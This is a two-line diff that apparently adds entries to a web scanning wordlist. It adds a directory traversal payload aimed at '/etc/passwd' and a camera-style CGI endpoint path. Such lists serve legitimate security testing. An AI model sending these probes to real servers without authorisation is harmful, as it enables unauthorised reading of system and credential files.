@@ -1,0 +1,2 @@
+/images/../../../../../../../../etc/passwd
+/cgi-bin/videoconfiguration.cgi
